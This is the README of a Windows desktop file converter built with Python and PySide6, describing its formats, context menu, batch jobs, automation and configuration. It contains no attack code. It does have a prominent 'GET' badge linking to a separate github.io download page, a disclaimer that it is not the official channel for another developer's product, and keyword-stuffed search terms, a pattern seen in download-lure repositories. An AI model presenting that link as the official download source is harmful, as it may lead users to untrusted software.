# File Converter Pro for Private Desktop Conversion

[![GET File Converter Pro](https://img.shields.io/badge/GET-File%20Converter%20Pro-7C3AED?style=for-the-badge&labelColor=312E81)](https://file-converter-context-menu.github.io/file-converter-offline/)

File Converter Pro is a Windows desktop utility for converting documents, images, audio, video, archives, and ebooks without sending source files to a web service.

It combines a graphical workspace, batch processing, automation, and a file converter context menu in one Python and PySide6 application.

The project is useful for anyone seeking a file converter offline workflow with local control over inputs, outputs, quality, compression, and supporting conversion engines.

## What Is File Converter Pro?

File Converter Pro provides a central interface for everyday format changes and more structured conversion projects.

Its file converter local conversion workflow keeps supported processing on the computer. Files can be selected in the main window, passed through Windows Explorer, collected into batches, or discovered by an automated folder watcher.

The application source is organized around a clear entry point in [main.py](src/main.py), interface construction in [ui.py](src/app/ui.py), and application behavior in [logic.py](src/app/logic.py).

This repository documents the available source and is not presented as an official distribution channel for another developer's product.

## Highlights

- Convert documents, images, audio, video, ebooks, and selected archive formats.
- Open supported conversions from a Windows context menu.
- Process multiple files with progress reporting and cancellation.
- Save reusable conversion templates.
- Monitor folders for new files.
- Schedule recurring or one-time conversion tasks.
- Configure external engines when automatic discovery is insufficient.
- Use light and dark interface themes.
- Run supported tasks without uploading personal files.
- Inspect and extend a file converter open source codebase.

| Area | Typical inputs | Example outputs | Processing path |
| --- | --- | --- | --- |
| Documents | DOCX, ODT, PPTX, XLSX, TXT | PDF, HTML, CSV, JSON | Native libraries or office engines |
| Images | JPG, PNG, WebP, HEIC, AVIF | PNG, JPG, PDF, ICO, SVG | Pillow and image helpers |
| Media | MP4, MOV, MKV, WAV, FLAC | MP4, MP3, WAV, GIF | FFmpeg when required |
| Ebooks | EPUB and related content | PDF or extracted content | Ebook and rendering helpers |
| Archives | Common packaged files | Extracted or repackaged files | Configured archive engine |

## File Explorer Context Menu

The Windows Explorer integration presents conversions that match the selected extension.

The supported input-to-output choices are defined in [formats.py](src/context_menu/formats.py), while [window.py](src/context_menu/window.py) creates the context-menu conversion window.

A direct context invocation is also implemented by the application entry point:

```powershell
python src/main.py --context-menu --files "C:\Files\photo.webp"
python src/main.py --context-menu --files "C:\Files\report.pdf" `
  --conversion-type pdf_to_docx
```

The first command opens the relevant choices. The second requests a confirmed conversion type directly.

This makes the file converter context menu suitable for quick right-click conversion without first organizing files inside the full interface.

## Supported Conversion Areas

### Documents and PDF

Document operations include text, office, OpenDocument, HTML, Markdown, PDF, spreadsheet, and presentation workflows.

The category and dispatch definitions are maintained in [registry.py](src/converter/registry.py). Core orchestration is implemented by [converters.py](src/converter/converters.py), with specialized document handling in [document_converters.py](src/converter/mixins/document_converters.py).

Representative tasks include:

- DOCX, ODT, and RTF document processing.
- PPTX and ODP presentation conversion.
- XLSX, ODS, CSV, and JSON data transformations.
- Text, HTML, Markdown, and PDF output.
- PDF rendering, merging, extraction, and optimization.
- Office to PDF operations when a compatible engine is available.

Document fidelity can depend on fonts, the source layout, and the external office engine installed on the machine.

### Images

Image conversion covers common web, desktop, photographic, and icon formats.

The implementation in [image_converters.py](src/converter/mixins/image_converters.py) handles image-specific routes, while format detection utilities restrict choices to suitable targets.

Common tasks include:

- HEIC or AVIF to JPG.
- WebP to PNG or JPG.
- PNG to ICO.
- JPG to PNG.
- Multiple images to a merged PDF.
- Image compression, resizing, and metadata-aware processing.
- Raster images to selected alternate or vector-oriented outputs.

### Audio and Video

Media conversion is routed through [media_converters.py](src/converter/mixins/media_converters.py).

Depending on the available engine, this area supports workflows such as:

- MOV, MKV, WebM, or AVI to MP4.
- MP4 to MP3 or GIF.
- M4A, FLAC, or WAV to MP3.
- MP3 to WAV.
- Video compression and audio extraction.
- Batch processing of multiple media files.

FFmpeg and its companion probe utility may be required for media inspection and transcoding.

## Batch Processing

The application prepares conversion jobs and runs them outside the main interface thread.

[conversion_worker.py](src/conversion_worker.py) reports progress, completed files, errors, and final results through Qt signals.

A batch can therefore contain multiple files while the user interface remains responsive.

Recommended batch practice:

1. Group inputs that require the same output type.
2. Confirm the destination directory before starting.
3. Select an appropriate quality or compression level.
4. Keep backups enabled when replacing valuable originals.
5. Review failures individually when a supporting engine is unavailable.

Batch behavior is particularly useful for image collections, office exports, audio libraries, and repeated file type conversion.

## Templates and Projects

Reusable templates reduce repeated configuration work.

[template_manager.py](src/templates/template_manager.py) manages stored templates, while project features preserve groups of files and related settings between sessions.

A template can capture a frequent output format, quality choice, destination strategy, or compression preference.

Projects are better suited to longer workflows where the user needs to return to the same collection later.

This separation keeps one-click jobs simple without limiting more detailed conversion sessions.

## Configuration

General preferences are managed by [config.py](src/config.py).

The configuration layer covers interface choices, output behavior, notification settings, preview options, backup preferences, theme selection, and other persistent values.

External executables can be declared in [external_binaries.conf](src/config/external_binaries.conf) when automatic detection does not find them:

```ini
[binaries]
ffmpeg = C:\Tools\ffmpeg\bin\ffmpeg.exe
ffprobe = C:\Tools\ffmpeg\bin\ffprobe.exe
libreoffice = C:\Program Files\LibreOffice\program\soffice.exe
tesseract = C:\Program Files\Tesseract-OCR\tesseract.exe
```

Empty values retain automatic discovery.

The application checks the system path, application-local locations, common installation folders, and configured fallback paths.

## Workflow and Automation

File Converter Pro supports watched folders and scheduled processing.

[watcher.py](src/tasks/watcher.py) observes configured locations for matching files. [scheduler.py](src/tasks/scheduler.py) evaluates interval, date, and cron-style triggers.

A concise watch-folder rule can look like this:

```toml
[watch_folders.inbox]
path = "C:/Users/User/Desktop/Inbox"
output_dir = "C:/Users/User/Desktop/Converted"
enabled = true
recursive = false

[watch_folders.inbox.rules]
png = ["pdf", "webp"]
wav = "mp3"
docx = "pdf"
```

Rules should use folders that the current Windows account can read and write.

Automation expands the file converter offline model beyond manual jobs while keeping watched data on the local system.

## Architecture

The source separates interface behavior, conversion dispatch, background execution, configuration, templates, automation, and packaging.

| Component | Responsibility |
| --- | --- |
| Application layer | Window state, user actions, projects, and panels |
| Context-menu layer | Explorer input handling and compatible choices |
| Converter layer | Conversion registry, helpers, and format-specific methods |
| Worker layer | Background job execution and progress events |
| Automation layer | Folder observation and scheduled tasks |
| Configuration layer | Persistent preferences and external tool paths |
| Packaging layer | Executable and installer build definitions |

This organization makes the file converter open source implementation easier to inspect and test without combining every conversion path into one module.

The file converter local conversion design also allows individual engines to fail with explicit diagnostics instead of silently moving data to a remote service.

## Command-Line Utilities

The included command handling exposes diagnostic and interface controls rather than pretending to be a universal shell converter.

Available examples include:

```powershell
python src/main.py --help
python src/main.py --version
python src/main.py --theme dark
python src/main.py --lang en --theme light
python src/main.py --daemon
```

The daemon option starts headless automation services. Theme and language switches override the corresponding interface choices for that launch.

Conversion names used by direct context-menu requests must match identifiers registered by the source.

## Privacy and Offline Use

Supported conversions are performed by local Python libraries or locally installed command-line engines.

This file converter offline approach can be valuable for confidential reports, personal media, unpublished artwork, and large files that are inconvenient to upload.

Users should still verify the behavior and licensing of optional third-party engines they install.

Local processing does not replace ordinary endpoint security:

- Keep conversion engines updated.
- Treat unknown documents and archives cautiously.
- Avoid overwriting the only copy of an important file.
- Review output before deleting the source.
- Restrict watched folders to intentional locations.

## Build from Source

Project metadata and Python dependencies are declared in `pyproject.toml` and the requirements files.

The coordinated Windows packaging process is available in [build_all.ps1](packaging/build_all.ps1).

A development environment requires Python 3.10 or newer and the dependencies appropriate to the conversion areas being tested.

Build tooling should be reviewed before use because local paths, signing options, and third-party binaries vary between systems.

## Troubleshooting

If a conversion type is missing, first confirm that the input extension is supported and that its required engine can be resolved.

If a media task fails, verify both FFmpeg and ffprobe. For office documents, check the configured Microsoft Office or LibreOffice integration.

For context-menu problems:

- Confirm that the selected file extension has registered output choices.
- Check whether Windows Explorer is exposing the expected menu entry.
- Try the explicit `--context-menu --files` invocation.
- Review paths containing spaces or non-ASCII characters.
- Test with a copy of the source file.

For automation problems, validate the TOML syntax, folder permissions, enabled flags, trigger settings, and destination path.

## Contributing

Contributions can focus on conversion routes, interface behavior, translations, automation, tests, packaging, or documentation.

Keep changes limited to a clear purpose and include tests when modifying dispatch rules or output behavior.

Do not commit private sample files, proprietary documents, credentials, signing material, or locally licensed conversion engines.

## License

The supplied project files identify File Converter Pro as GNU General Public License v3.0 software.

Review the repository license and the separate licenses of bundled or optional dependencies before redistribution.

## Related Search Terms

file converter context menu, file converter offline, file converter, file converter open source, file converter local conversion, windows, desktop-app, file-converter, file-conversion, document-conversion, image-converter, audio-converter, video-transcoding, batch-processing, pyside6, python
